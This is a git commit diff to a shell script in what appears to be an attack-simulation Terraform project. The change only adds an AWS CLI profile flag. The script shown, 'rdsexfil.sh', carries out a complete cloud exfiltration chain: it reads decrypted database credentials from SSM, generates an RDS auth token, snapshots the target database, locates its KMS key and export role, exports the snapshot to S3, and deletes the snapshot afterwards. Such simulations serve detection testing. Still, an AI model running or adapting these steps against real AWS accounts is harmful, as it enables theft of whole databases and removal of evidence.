32080335112e0f7a3af88abf297e0dfcbee946e9
credibleforce <jamiefrasermcmurray@gmail.com>
2023-09-14 20:01:55 -0700

    update

--- terraform/modules/attack/simulate/aws/modules/ssm/responder-reverse-shell-multistage/resources/rdsexfil.sh
+++ terraform/modules/attack/simulate/aws/modules/ssm/responder-reverse-shell-multistage/resources/rdsexfil.sh
@@ -9,22 +9,22 @@ ENVIRONMENT=target
 DEPLOYMENT=${deployment}
 
 log "Using default profile"
-PROFILE="default"
+PROFILE="db"
 opts="--no-cli-pager"
 
 log "Downloading jq..."
 curl -LJ -o /usr/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 /usr/bin/jq
 
 log "Getting db connect token..."
-DBHOST="$(aws ssm get-parameter --name="db_host" --with-decryption --region=$REGION $opts| jq -r '.Parameter.Value' | cut -d ":" -f 1)"
-DBUSER="$(aws ssm get-parameter --name="db_username" --with-decryption --region=$REGION $opts | jq -r '.Parameter.Value')"
-DBPORT="$(aws ssm get-parameter --name="db_port" --with-decryption --region=$REGION $opts | jq -r '.Parameter.Value')"
-TOKEN="$(aws rds generate-db-auth-token --hostname $DBHOST --port $DBPORT --region $REGION --username $DBUSER $opts)"
+DBHOST="$(aws ssm get-parameter --name="db_host" --with-decryption --profile=$PROFILE --region=$REGION $opts| jq -r '.Parameter.Value' | cut -d ":" -f 1)"
+DBUSER="$(aws ssm get-parameter --name="db_username" --with-decryption --profile=$PROFILE --region=$REGION $opts | jq -r '.Parameter.Value')"
+DBPORT="$(aws ssm get-parameter --name="db_port" --with-decryption --profile=$PROFILE --region=$REGION $opts | jq -r '.Parameter.Value')"
+TOKEN="$(aws rds generate-db-auth-token --profile=$PROFILE --hostname $DBHOST --port $DBPORT --region $REGION --username $DBUSER $opts)"
 log "Token: $TOKEN"
 
 log "Getting DbInstanceIdentifier..."
 DB_INSTANCE_ID=$(aws rds describe-db-instances \
-  \
+  --profile=$PROFILE \
   --region=$REGION  \
   $opts \
   | jq -r ".DBInstances[] | select(.TagList[] | (.Key == \"environment\" and .Value == \"$ENVIRONMENT\")) | select(.TagList[] | (.Key == \"deployment\" and .Value == \"$DEPLOYMENT\")) | .DBInstanceIdentifier")
@@ -34,7 +34,7 @@ log "Creating rds snapshot..."
 NOW_DATE=$(date '+%Y-%m-%d-%H-%M-%S')
 CURRENT_DATE=$(date +%Y-%m-%d)
 DB_SNAPSHOT_ARN=$(aws rds create-db-snapshot \
-     \
+    --profile=$PROFILE  \
     --region=$REGION  \
     $opts   \
     --db-instance-identifier $DB_INSTANCE_ID \
@@ -49,14 +49,14 @@ aws rds wait db-snapshot-completed --db-snapshot-identifier $opts $DB_SNAPSHOT_A
 log "RDS snapshot complete."
 
 log "Obtaining the KMS key id..."
-for keyId in $(aws kms list-keys --query 'Keys[].KeyId' --region=$REGION --output json $opts| jq -r '.[]'); do
+for keyId in $(aws kms list-keys --query 'Keys[].KeyId' --profile=$PROFILE --region=$REGION --output json $opts| jq -r '.[]'); do
   echo $keyId
-  keyinfo=$(aws kms describe-key --key-id "$keyId" --query 'KeyMetadata' --output json --region=$REGION $opts 2> /dev/null)
+  keyinfo=$(aws kms describe-key --key-id "$keyId" --query 'KeyMetadata' --output json --profile=$PROFILE --region=$REGION $opts 2> /dev/null)
   echo $keyinfo
   enabled=$(echo "$keyinfo" | jq -r '.Enabled')
   echo $enabled
   if [ "$enabled" = "true" ]; then
-    TAG_VALUE=$(aws kms list-resource-tags --key-id "$keyId" --region=$REGION $opts 2> /dev/null | jq -r ".Tags[] | select(.TagKey==\"Name\" and .TagValue==\"db-kms-key-$ENVIRONMENT-$DEPLOYMENT\") | .TagValue")
+    TAG_VALUE=$(aws kms list-resource-tags --key-id "$keyId" --profile=$PROFILE --region=$REGION $opts 2> /dev/null | jq -r ".Tags[] | select(.TagKey==\"Name\" and .TagValue==\"db-kms-key-$ENVIRONMENT-$DEPLOYMENT\") | .TagValue")
     echo "Tag: $TAG_VALUE"
     if [ "$TAG_VALUE" == "db-kms-key-$ENVIRONMENT-$DEPLOYMENT" ]; then
       echo "Found: $keyId"
@@ -68,13 +68,13 @@ done
 log "KMS Key Id: $KMS_KEY_ID"
 
 log "Obtaining rds export role..."
-RDS_EXPORT_ROLE_ARN=$(aws iam list-roles --region=$REGION $opts | jq -r ".Roles[] | select(.RoleName==\"rds-s3-export-role-$ENVIRONMENT-$DEPLOYMENT\") | .Arn")
+RDS_EXPORT_ROLE_ARN=$(aws iam list-roles --profile=$PROFILE --region=$REGION $opts | jq -r ".Roles[] | select(.RoleName==\"rds-s3-export-role-$ENVIRONMENT-$DEPLOYMENT\") | .Arn")
 log "RDS export role: $RDS_EXPORT_ROLE_ARN"
 
 log "Exporting rds snapshot to s3..."
 EXPORT_TASK_IDENTIFIER="snapshot-export-$ENVIRONMENT-$DEPLOYMENT-$NOW_DATE"
 EXPORT_TASK_ARN=$(aws rds start-export-task \
-     \
+    --profile=$PROFILE  \
     --region=$REGION  \
     $opts   \
     --export-task-identifier $EXPORT_TASK_IDENTIFIER \
@@ -89,7 +89,7 @@ log "Export task identifier: $EXPORT_TASK_IDENTIFIER"
 
 log "Getting snapshot export task status..."
 aws rds describe-export-tasks \
-     \
+    --profile=$PROFILE  \
     --region=$REGION  \
     $opts   \
     --export-task-identifier $EXPORT_TASK_IDENTIFIER \
@@ -97,7 +97,7 @@ aws rds describe-export-tasks \
     $opts >> $LOGFILE 2>&1
 
 while true; do
-    STATUS=$(aws rds describe-export-tasks --region=$REGION --export-task-identifier $EXPORT_TASK_IDENTIFIER --source-arn $DB_SNAPSHOT_ARN --query 'ExportTasks[0].Status' $opts --output text)
+    STATUS=$(aws rds describe-export-tasks --profile=$PROFILE --region=$REGION --export-task-identifier $EXPORT_TASK_IDENTIFIER --source-arn $DB_SNAPSHOT_ARN --query 'ExportTasks[0].Status' $opts --output text)
     
     if [ "$STATUS" == "COMPLETE" ]; then
         log "Export task completed successfully."
@@ -113,7 +113,7 @@ done
 
 log "Deleting snapshot..."
 aws rds delete-db-snapshot \
-     \
+    --profile=$PROFILE  \
     --region=$REGION \
     $opts   \
     --db-snapshot-identifier $DB_SNAPSHOT_IDENTIFIER \
